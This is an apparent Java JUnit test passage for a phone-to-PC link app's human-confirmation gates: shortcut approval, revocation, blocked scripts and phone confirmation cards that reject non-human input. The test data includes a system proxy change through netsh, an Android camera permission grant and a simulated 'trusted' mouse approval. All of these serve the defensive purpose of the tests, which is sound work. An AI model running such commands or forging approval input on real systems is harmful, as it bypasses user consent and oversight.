                            if (allow && hasClass("com.onesay.desktop.ConfirmGate")) {
                                // [确认框加固] 改：电脑端确认框要先显示（界面报 seen）、等过约 0.7 秒，再用本机鼠标点「允许」才算数
                                Map<String, Object> sb = new TreeMap<String, Object>();
                                sb.put("op", "seen");
                                sb.put("id", x.get("id"));
                                sb.put("focused", Boolean.TRUE);
                                api("confirm", sb);
                                Thread.sleep(900);
                                b.put("input", "mouse");
                                b.put("trusted", Boolean.TRUE);
                            }
                            b.put("allow", allow);
                            b.put("always", always);
                            api("confirm", b);
                            return;
                        }
                        Thread.sleep(100);
                    }
                } catch (Exception ignored) {
                    // 断言在主线程里做
                }
            }
        }, "pc-confirm");
        t.setDaemon(true);
        t.start();
        return t;
    }

    static Map<?, ?> scEntry(String key, String id) throws Exception {
        for (Object o : (List<?>) api("state", null).get(key)) if (id.equals(((Map<?, ?>) o).get("id"))) return (Map<?, ?>) o;
        return null;
    }

    @Test public void shortcutApprovalThroughDesktopApi() throws Exception {
        Assume.assumeTrue("电脑端 jar 还没有快捷指令批准（PcGuard$Shortcut），跳过", hasClass("com.onesay.desktop.PcGuard$Shortcut"));
        Path scDir = Files.createTempDirectory("pclink-sc");
        Path sc = scDir.resolve("下班模式.ps1");
        Files.write(sc, "Start-Process notepad\r\n".getBytes(StandardCharsets.UTF_8));
        assertEquals(Boolean.TRUE, api("settings", mm("scripts_dir", scDir.toString(), "pc_level", "auto")).get("ok"));
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-sc", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-sc"));
        InetSocketAddress addr = PcLanClient.locate(p, 3000, null);
        assertNotNull(addr);
        PcLanClient.Session s = PcLanClient.Session.open(p, addr, 5000);
        try {
            assertTrue(s.tls());
            assertEquals("new", scEntry("shortcut_policy", "下班模式.ps1").get("status"));

            // 第一次：电脑上弹确认（带「以后直接执行」），点拒绝 → shortcut_needs_approval + confirm_denied，中文原因
            List<Map<?, ?>> seen = new CopyOnWriteArrayList<Map<?, ?>>();
            Thread t = answerOnPc(false, false, seen);
            PcLanClient.Result r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertFalse(r.ok);
            assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, r.data.get("reason"));
            assertEquals(LinkPolicy.R_CONFIRM_DENIED, r.data.get("confirm_result"));
            assertEquals("这个快捷指令还没在电脑上批准", r.data.get("reason_zh"));
            assertEquals(1, seen.size());
            assertEquals(Boolean.TRUE, seen.get(0).get("always"));
            assertTrue(String.valueOf(seen.get(0).get("detail")), String.valueOf(seen.get(0).get("detail")).contains("运行快捷指令「下班模式」"));

            // 点「以后直接执行」→ 过了策略交给执行端（测试执行端不会真跑，回「不支持」但没有原因码）；批准表里有了，并写进配置
            t = answerOnPc(true, true, seen);
            r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertEquals(2, seen.size());
            assertNull(String.valueOf(r.data), r.data.get("reason"));
            assertTrue(r.text, r.text.contains("shortcut_run"));
            assertEquals("approved", scEntry("shortcut_approvals", "下班模式.ps1").get("status"));
            assertEquals("approved", scEntry("shortcut_policy", "下班模式.ps1").get("status"));
            String props = new String(Files.readAllBytes(dir.resolve("desktop.properties")), StandardCharsets.UTF_8);
            assertTrue(props, props.contains("shortcut_approvals=") && !props.contains("shortcut_approvals=\n"));

            // 之后自动 / 完全访问都不问，直接执行
            for (String lvl : new String[]{"auto", "full"}) {
                api("settings", mm("pc_level", lvl));
                long t0 = System.currentTimeMillis();
                r = s.request("shortcut_run", mm("name", "下班模式.ps1"), 40000);
                assertNull(lvl + " " + r.data, r.data.get("reason"));
                assertTrue(lvl, System.currentTimeMillis() - t0 < 10000);
                assertEquals(lvl, ((List<?>) api("state", null).get("confirms")).size(), 0);
            }
            assertEquals(2, seen.size());
            // 只读：拒
            api("settings", mm("pc_level", "read_only"));
            assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, s.request("shortcut_run", mm("name", "下班模式"), 40000).data.get("reason"));
            api("settings", mm("pc_level", "auto"));

            // 改内容 → shortcut_changed，重新问
            Files.write(sc, "Start-Process calc\r\n".getBytes(StandardCharsets.UTF_8));
            assertEquals("changed", scEntry("shortcut_policy", "下班模式.ps1").get("status"));
            t = answerOnPc(false, false, seen);
            r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertEquals(LinkPolicy.R_SHORTCUT_CHANGED, r.data.get("reason"));
            assertEquals(3, seen.size());

            // 电脑界面撤销 → 回到第一次
            Map<String, Object> rv = api("shortcuts", mm("op", "revoke", "id", "下班模式.ps1"));
            assertEquals(String.valueOf(rv), Boolean.TRUE, rv.get("ok"));
            assertNull(scEntry("shortcut_approvals", "下班模式.ps1"));
            assertEquals(Boolean.FALSE, api("shortcuts", mm("op", "revoke", "id", "下班模式.ps1")).get("ok"));
            t = answerOnPc(false, false, seen);
            r = s.request("shortcut_run", mm("name", "下班模式"), 40000);
            t.join(5000);
            assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, r.data.get("reason"));

            // 内容碰严格规则：不问、不能批准，原因带回手机
            // [插件 / C] 改：HKCU 下的代理设置现在是普通用户能做的事，放行；换成要管理员的系统级代理（netsh winhttp）测「不能批准」
            Files.write(scDir.resolve("改代理.ps1"), "netsh winhttp set proxy 127.0.0.1:8080".getBytes(StandardCharsets.UTF_8));
            int before = seen.size();
            r = s.request("shortcut_run", mm("name", "改代理"), 40000);
            assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, r.data.get("reason"));
            assertTrue(r.text, r.text.contains("只能你在电脑上自己运行"));
            assertEquals(before, seen.size());
            Map<?, ?> blk = scEntry("shortcut_policy", "改代理.ps1");
            assertEquals("blocked", blk.get("status"));
            assertTrue(String.valueOf(blk.get("why")), String.valueOf(blk.get("why")).contains("管理员"));
            // 列表里没有的
            assertEquals(LinkPolicy.R_UNKNOWN, s.request("shortcut_run", mm("name", "nope"), 40000).data.get("reason"));
        } finally {
            s.close();
            api("settings", mm("scripts_dir", "", "pc_level", "auto"));
        }
    }

    @Test public void healthzProbeAnswersOnSamePort() {
        assertTrue(PcLanClient.healthz(new InetSocketAddress("127.0.0.1", port), 1500));
        assertFalse(PcLanClient.healthz(new InetSocketAddress("127.0.0.1", 1), 500));
    }

    static List<String> lines(String s) {
        List<String> out = new ArrayList<String>();
        for (String l : s.split("\n")) out.add(l);
        return out;
    }

    static boolean reachable(int p) {
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress("127.0.0.1", p), 300);
            s.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    // ------------------------------------------------------------------ [approve-not-block] 能批就不拦：手机屏幕确认卡（真电脑端 jar）

    /** 测试用确认卡界面：记下开过的卡，不真画。 */
    static final class CardUi implements PcConfirm.Ui {
        final List<PcConfirm.Card> opened = new CopyOnWriteArrayList<PcConfirm.Card>();
        final List<Integer> closed = new CopyOnWriteArrayList<Integer>();

        @Override public void open(PcConfirm.Card c) { opened.add(c); }

        @Override public void close(PcConfirm.Card c) { closed.add(Integer.valueOf(c.id)); }

        PcConfirm.Card await(long ms) throws InterruptedException {
            long end = System.currentTimeMillis() + ms;
            while (opened.isEmpty() && System.currentTimeMillis() < end) Thread.sleep(50);
            return opened.isEmpty() ? null : opened.remove(0);
        }
    }

    /** 手机端 GuardEnv + 确认卡（Asker）：答案由测试定；记住的类型在内存里。 */
    static final class AskEnv implements PcRx.Env, PcRx.Handler, PcRx.Guard, PcRx.Asker {
        final GuardEnv g;
        volatile int answer = PcConfirm.TIMEOUT;
        final List<String> asked = new CopyOnWriteArrayList<String>();
        final List<String> kinds = new CopyOnWriteArrayList<String>();

        AskEnv(PcLanClient.Peer p, File ws) { g = new GuardEnv(p, ws); }

        @Override public boolean wanted() { return g.wanted(); }
        @Override public boolean onLan() { return true; }
        @Override public PcLanClient.Peer peer() { return g.peer(); }
        @Override public List<InetAddress> extraBroadcasts() { return null; }
        @Override public void multicast(boolean hold) { }
        @Override public void state(String s, String d) { g.state(s, d); }
        @Override public void remember(InetSocketAddress a) { }
        @Override public PcRx.Handler handler() { return this; }
        @Override public boolean enabled(String cmd) { return g.enabled(cmd); }
        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) { return g.run(cmd, args); }
        @Override public void record(String cmd, boolean ok, String text) { }
        @Override public void appFacts(String cmd, Map<String, Object> a, LinkPolicy.Facts f) { g.appFacts(cmd, a, f); }
        @Override public File workspace() { return g.workspace(); }
        @Override public String script(String cmd, Map<String, Object> a, String why) { return g.script(cmd, a, why); }

        @Override public int ask(String title, String detail, String rememberKind) {
            asked.add(detail + "|" + rememberKind);
            return answer;
        }

        @Override public java.util.Collection<String> rememberedKinds() { return kinds; }

        @Override public void remember(String kind) { if (!kinds.contains(kind)) kinds.add(kind); }

        @Override public boolean clipAutoClear() { return false; }
    }

    static PcRx.Loop startLoop(PcRx.Env env, String name) {
        PcRx.Loop loop = new PcRx.Loop(env);
        loop.minBackoff = 300;
        loop.maxBackoff = 1000;
        Thread t = new Thread(loop, name);
        t.setDaemon(true);
        t.start();
        return loop;
    }

    /**
     * 手机 → 电脑：电脑上要确认的指令，确认卡同时发到这台手机的常连通道；手机卡上真人手指点「允许」= 批准（语音 / 无障碍 / 机器人不算），
     * 勾「以后这类不用问」后同类不再问；远程「approve」指令照旧 voice_approval_blocked。
     */
    @Test public void phoneCardApprovesDesktopConfirm() throws Exception {
        Assume.assumeTrue("电脑端 jar 还没有手机确认卡（approve-not-block），跳过", hasClass("com.onesay.desktop.PcGuard$PhoneOffer"));
        assertEquals(Boolean.TRUE, api("settings", mm("pc_sandbox", "workspace_write", "pc_approval", "untrusted")).get("ok"));
        PcConfirm.reset();
        CardUi ui = new CardUi();
        PcConfirm.ui = ui;
        PcPairing pp = PcPairing.parse(pairing());
        final PcLanClient.Peer p = new PcLanClient.Peer("phone-card", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-card"));
        File ws = java.nio.file.Files.createTempDirectory("interop-card").toFile();
        GuardEnv env = new GuardEnv(p, ws);
        PcRx.Loop loop = startLoop(env, "rx-card");
        PcLanClient.Session s = null;
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.base.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.base.state, env.base.state.startsWith(PcRx.S_UP));
            Thread.sleep(200);
            s = PcLanClient.Session.open(p, PcLanClient.locate(p, 3000, null), 5000);
            final PcLanClient.Session fs = s;
            final PcLanClient.Result[] res = new PcLanClient.Result[1];
            Thread rq = new Thread(new Runnable() {
                @Override public void run() {
                    try { res[0] = fs.request("sys_exec", mm("command", "echo card-ok"), 75000); } catch (Exception ignored) { }
                }
            }, "phone-card-req");
            rq.setDaemon(true);
            rq.start();
            PcConfirm.Card c = ui.await(10000);
            assertNotNull("电脑上的确认卡发到了手机", c);
            assertEquals(PcConfirm.KIND_PC, c.kind);
            assertTrue(c.detail, c.detail.contains("echo card-ok"));
            assertEquals("pc.shell_exec", c.rememberKind);
            List<?> cs = (List<?>) api("state", null).get("confirms");
            assertEquals("电脑界面上也显示已发到手机", Boolean.TRUE, ((Map<?, ?>) cs.get(0)).get("phone"));
            PcConfirm.shown(c.id, true);
            // 语音 / 无障碍 / 遮挡 / 机器人：都不算
            assertEquals(PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.VOICE));
            assertEquals(PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.ACCESSIBILITY));
            assertEquals("0.7 秒内不算", PcConfirm.Answer.TOO_EARLY, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
            Thread.sleep(LinkPolicy.CONFIRM_ARM_MS + 100);
            PcConfirm.noteRobotInput();
            assertEquals("机器人刚点过", PcConfirm.Answer.NOT_HUMAN, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
            Thread.sleep(PcConfirm.ROBOT_WINDOW_MS + 100);
            assertEquals(PcConfirm.Answer.ACCEPTED, PcConfirm.answer(c.id, true, false, true, PcConfirm.Input.TOUCH));
            rq.join(15000);
            assertNotNull("电脑回了结果", res[0]);
            assertTrue(res[0].text, res[0].ok);
            assertTrue(String.valueOf(res[0].data), String.valueOf(res[0].data.get("output")).contains("card-ok"));
            assertTrue(out(), out().contains("真人触摸"));
            // 勾了「以后这类不用问」：同类直接执行，不再发卡
            List<?> rem = (List<?>) api("state", null).get("remembered");
            assertEquals(1, rem.size());
            assertEquals("pc.shell_exec", ((Map<?, ?>) rem.get(0)).get("kind"));
            PcLanClient.Result again = s.request("sys_exec", mm("command", "echo again"), 15000);
            assertTrue(again.text, again.ok);
            assertNull("没再发卡", ui.await(500));
            // 撤销后又问（这次在电脑界面上拒绝）
            assertEquals(Boolean.TRUE, api("remembered", mm("op", "revoke", "kind", "pc.shell_exec")).get("ok"));
            final PcLanClient.Result[] res2 = new PcLanClient.Result[1];
            Thread rq2 = new Thread(new Runnable() {
                @Override public void run() {
                    try { res2[0] = fs.request("sys_exec", mm("command", "echo third"), 75000); } catch (Exception ignored) { }
                }
            }, "phone-card-req2");
            rq2.setDaemon(true);
            rq2.start();
            PcConfirm.Card c2 = ui.await(10000);
            assertNotNull(c2);
            Object id = ((Map<?, ?>) ((List<?>) api("state", null).get("confirms")).get(0)).get("id");
            assertEquals(Boolean.TRUE, api("confirm", mm("id", id, "allow", false)).get("ok"));
            rq2.join(15000);
            assertEquals(LinkPolicy.R_CONFIRM_DENIED, res2[0].data.get("reason"));
            for (int i = 0; i < 40 && PcConfirm.card(c2.id) != null; i++) Thread.sleep(50);
            assertNull("电脑那边结束了，手机卡收起", PcConfirm.card(c2.id));
            // 远程 approve 指令照旧拒
            assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, s.request("approve", mm("id", 1), 15000).data.get("reason"));
        } finally {
            if (s != null) s.close();
            env.base.wanted = false;
            loop.stop();
            PcConfirm.reset();
            PcConfirm.ui = null;
        }
    }

    /** 电脑 → 手机：原来拒的（支付类 App）改成手机上弹确认卡；允许才做、拒绝 / 没人点不做；记住后同类不再问；硬规则（授权 / 卸载 OneSay 自己）照旧。 */
    @Test public void desktopCommandAsksOnPhoneCard() throws Exception {
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-ask", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-ask"));
        AskEnv env = new AskEnv(p, java.nio.file.Files.createTempDirectory("interop-ask").toFile());
        PcRx.Loop loop = startLoop(env, "rx-ask");
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.g.base.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.g.base.state, env.g.base.state.startsWith(PcRx.S_UP));
            Thread.sleep(200);
            env.answer = PcConfirm.DENY;
            assertEquals(LinkPolicy.R_CONFIRM_DENIED, why(phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone"))));
            assertEquals(1, env.asked.size());
            assertTrue(env.asked.get(0), env.asked.get(0).endsWith("|phone.blocked_app.uninstall"));
            assertTrue(env.g.base.ran.isEmpty());
            env.answer = PcConfirm.REMEMBER;
            assertEquals(Boolean.TRUE, phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone")).get("ok"));
            assertEquals(1, env.g.base.ran.size());
            assertEquals(java.util.Arrays.asList("phone.blocked_app.uninstall"), env.kinds);
            env.answer = PcConfirm.DENY;
            assertEquals("记住了：不再问", Boolean.TRUE, phone("uninstall_app", mm("package", "com.unionpay")).get("ok"));
            assertEquals(2, env.asked.size());
            // 硬规则：问都不问
            assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(phone("sys_exec", mm("command", "pm grant com.x android.permission.CAMERA"))));
            assertEquals(2, env.asked.size());
        } finally {
            env.g.base.wanted = false;
            loop.stop();
        }
    }
}
